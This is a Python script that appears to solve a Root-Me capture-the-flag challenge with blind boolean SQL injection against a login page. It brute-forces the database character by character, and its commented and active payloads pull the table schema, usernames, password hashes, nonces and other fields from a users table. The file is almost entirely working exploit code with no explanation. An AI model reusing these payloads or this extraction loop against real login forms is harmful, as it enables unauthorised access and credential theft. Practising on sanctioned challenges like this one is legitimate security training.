import requests

def query_db(
    inject_fn,
    url: str = 'http://challenge01.root-me.org/realiste/ch12/login.aspx',
    alphabet: str = "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ {};_!@#$%^&*()[]{}-+=<>,./?|\\~`'\"'`",
    max_res: int = 100,
    res_start: int = 0,
    max_lenght: int = 1000,
    lenght_start: int = 1,
    allow_unknown_char: bool = False
):
    result = ""

    for index in range(res_start, max_res):
        print("Searching for index", index)
        not_found = 0

        for pos in range(lenght_start, max_lenght):
            found = False

            for char in alphabet:
                inject = inject_fn(index, pos, char)

                data = {
                    'login': inject,
                    'password': 'test'
                }

                response = requests.post(url, data=data)

                if "user/password" in response.text or "wrong password" in response.text:
                    result += char
                    found = True
                    print(format(pos, ' 3d'), f"'{char}'", '->', result)
                    break

            if not found:
                not_found += 1
                print("end")
                result = ""
                not_found = 0
                if not allow_unknown_char:
                    break

            if not_found > 8:
                break

        print(f"Result for index {index}: ", result)

# Get table schema for table 'users'
# query_db(
#     lambda index, pos, char: f"admin' AND SUBSTR((SELECT sql FROM sqlite_master WHERE tbl_name = 'users' AND type = 'table' LIMIT {index},1), {pos}, 1) = '{char}' --"
# )

# Get all SQL queries in the db -> no other queries found
# query_db(
#     lambda index, pos, char: f"admin' AND SUBSTR((SELECT sql FROM sqlite_master LIMIT {index},1), {pos}, 1) = '{char}' --",
#     res_start=1,
# )

# Get value for column 'password' in table 'users' for user 'admin'
# query_db(
#     lambda index, pos, char: f"admin' AND SUBSTR((SELECT password FROM users WHERE username = 'customer223'), {pos}, 1) = '{char}' --",
#     alphabet="1234567890ABCDEF",
#     max_res=1
# )

# Get value for column 'nonce' in table 'users' for user 'admin'
# query_db(
#     lambda index, pos, char: f"admin' AND SUBSTR((SELECT nonce FROM users WHERE username = 'customer223'), {pos}, 1) = '{char}' --",
#     alphabet="1234567890abcdefghijklmnopqrstuvwxyz",
#     max_res=1
# )
        
# Get value for column 'year' in table 'users' for user 'admin'
query_db(
    lambda index, pos, char: f"admin' AND SUBSTR((SELECT year FROM users WHERE username = 'customer1213'), {pos}, 1) = '{char}' --",
    alphabet="1234567890",
    max_res=1
)
        
# Get all users in the db
# query_db(
#     lambda index, pos, char: f"admin' AND SUBSTR((SELECT username FROM users LIMIT {index},1), {pos}, 1) = '{char}' --",
#     alphabet="1234567890abcdefghijklmnopqrstuvwxyz",
# )
